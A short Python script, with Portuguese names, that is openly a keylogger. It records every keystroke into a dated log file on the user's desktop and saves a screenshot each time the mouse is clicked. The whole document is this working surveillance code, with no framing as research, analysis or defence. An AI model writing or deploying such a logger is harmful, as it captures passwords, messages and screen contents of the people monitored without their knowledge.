from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener
from datetime import datetime
import re, os, pyautogui as py
from pynput.keyboard import Key


dataAtual = datetime.now()
data = dataAtual.strftime("%d - %m")
diretorioRaiz = "/Users/Usuário/Desktop/keyloger" + data + "/"
arquiviosLog = diretorioRaiz + 'Keylogger.log'

try:
    os.mkdir(diretorioRaiz)
except:
    pass

def on_press(tecla):
    with open(arquiviosLog, 'a') as log:
        try:
            if tecla == Key.enter:
                log.write('\n')  
            else:
                if hasattr(tecla, 'char'):
                    log.write(tecla.char)
                else:
                    log.write(str(tecla).replace('Key.', ''))
        except AttributeError:
            log.write(str(tecla).replace('Key.', ''))



def on_click(x, y, button, pressed):
    if pressed:
        minhaPrint = py.screenshot()
        hora = datetime.now()
        horarioPrint = hora.strftime("%H-%M-%S")
        minhaPrint.save(os.path.join(diretorioRaiz, "printKeylogger_" + horarioPrint + ".jpg"))

KeyboardListener = KeyboardListener(on_press=on_press)
MouseListener = MouseListener(on_click=on_click)

KeyboardListener.start()
MouseListener.start()
KeyboardListener.join()
MouseListener.join()
